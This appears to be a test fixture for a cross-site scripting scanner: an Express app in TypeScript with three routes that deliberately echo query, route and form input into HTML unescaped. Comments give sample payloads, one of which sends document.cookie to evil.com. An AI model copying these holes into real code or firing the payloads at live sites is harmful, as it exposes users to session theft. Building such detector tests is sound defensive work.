// Fixture: js-express-direct-send — Express res.send() with user input concatenation
// Expected: TRUE POSITIVE (high confidence)
// CWE: CWE-79
// Agent: xss
// Pattern: User input from req.query/req.params concatenated into HTML string via res.send()/res.write()

import express, { Request, Response } from "express";

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// VULNERABLE: req.query value concatenated into HTML response via res.send()
// Express sets Content-Type: text/html by default for string responses
// Attacker sends: GET /search?q=<script>alert(1)</script>
app.get("/search", (req: Request, res: Response) => {
  const query = req.query.q as string || "";
  const results = [
    { title: "Result 1", url: "/page/1" },
    { title: "Result 2", url: "/page/2" },
  ];

  // VULNERABLE: direct string concatenation with user input
  let html = `
    <html>
    <head><title>Search: ${query}</title></head>
    <body>
      <h1>Results for: ${query}</h1>
      <ul>
        ${results.map(r => `<li><a href="${r.url}">${r.title}</a></li>`).join("")}
      </ul>
    </body>
    </html>
  `;
  res.send(html);
});

// VULNERABLE: req.params echoed via res.write() without encoding
// Attacker sends: GET /user/<img src=x onerror=alert(1)>
app.get("/user/:username", (req: Request, res: Response) => {
  const username = req.params.username;
  res.setHeader("Content-Type", "text/html");
  // VULNERABLE: user-controlled route parameter in HTML output
  res.write(`<html><body><h1>Profile: ${username}</h1>`);
  res.write(`<p>Welcome back, ${username}!</p>`);
  res.write("</body></html>");
  res.end();
});

// VULNERABLE: POST body reflected in HTML response
// Attacker submits: message=<svg/onload=fetch('https://evil.com/'+document.cookie)>
app.post("/feedback", (req: Request, res: Response) => {
  const message = req.body.message || "";
  const email = req.body.email || "";

  // VULNERABLE: form input reflected directly in confirmation page
  res.send(`
    <html><body>
      <h2>Thank you for your feedback!</h2>
      <div class="confirmation">
        <p>From: ${email}</p>
        <p>Message: ${message}</p>
      </div>
    </body></html>
  `);
});

app.listen(3000);
